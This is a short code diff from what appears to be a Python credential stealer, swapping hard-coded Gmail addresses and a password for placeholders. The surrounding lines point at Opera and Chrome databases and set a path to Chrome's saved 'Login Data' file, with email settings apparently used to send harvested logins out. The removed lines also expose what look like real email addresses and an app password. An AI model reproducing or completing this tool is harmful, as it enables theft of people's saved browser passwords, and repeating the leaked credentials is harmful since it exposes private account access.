@@ -11,9 +11,9 @@ operadb = "operadb.db"
 chromedb = 'chrome.db'
 
 if __name__ == '__main__':
-    FROM_EMAIL = 'xablau.mpx@gmail.com'
-    FROM_PASSWORD = 'owgshskgdmnoiyjj'
-    TO_EMAIL = 'vinibruno99@gmail.com'
+    FROM_EMAIL = 'YOUR_EMAIL@gmail.com'
+    FROM_PASSWORD = 'YOUR_PASSWORD'
+    TO_EMAIL = 'SENDER_EMAIL@gmail.com'
     LOGIN_PATH = r'AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data'
     
     vb = Vbscript(
